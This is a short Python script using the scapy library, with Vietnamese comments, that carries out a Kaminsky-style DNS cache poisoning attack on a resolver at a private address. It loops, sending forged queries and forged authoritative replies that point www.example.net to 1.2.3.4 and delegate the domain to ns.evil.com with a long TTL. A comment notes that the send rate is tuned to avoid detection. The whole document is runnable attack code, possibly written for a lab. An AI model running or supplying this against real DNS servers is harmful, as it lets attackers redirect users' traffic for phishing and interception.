from scapy.all import *
import random
import time

# Các thông tin giả mạo
target_dns_server = "192.168.108.139"
fake_ns_ip = "192.168.108.200"
spoofed_ip = "1.2.3.4"
name = "www.example.net"
domain = "example.net"
ns = "ns.evil.com"

# Hàm gửi liên tục các gói request và reply giả mạo
def kaminsky_attack():
    while True:
        # Random transaction ID và source port
        transaction_id = random.randint(0, 65535)
        source_port = random.randint(1024, 65535)

        # Tạo DNS request
        Qdsec = DNSQR(qname=name)
        dns_request = DNS(id=transaction_id, qr=0, qdcount=1, qd=Qdsec)
        ip_request = IP(dst=target_dns_server, src=fake_ns_ip)
        udp_request = UDP(dport=53, sport=source_port)
        request_packet = ip_request/udp_request/dns_request

        # Gửi DNS request
        send(request_packet, verbose=0)

        # Tạo DNS reply giả mạo
        Anssec = DNSRR(rrname=name, type="A", rdata=spoofed_ip, ttl=259200)
        NSsec = DNSRR(rrname=domain, type="NS", rdata=ns, ttl=259200)
        dns_reply = DNS(id=transaction_id, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, qd=Qdsec, an=Anssec, ns=NSsec)
        ip_reply = IP(dst=target_dns_server, src=fake_ns_ip)
        udp_reply = UDP(dport=53, sport=source_port)
        reply_packet = ip_reply/udp_reply/dns_reply

        # Gửi DNS reply giả mạo liên tục
        send(reply_packet, verbose=0)
        time.sleep(0.1)  # Điều chỉnh tần suất gửi để giảm nguy cơ bị phát hiện

# Bắt đầu tấn công
kaminsky_attack()
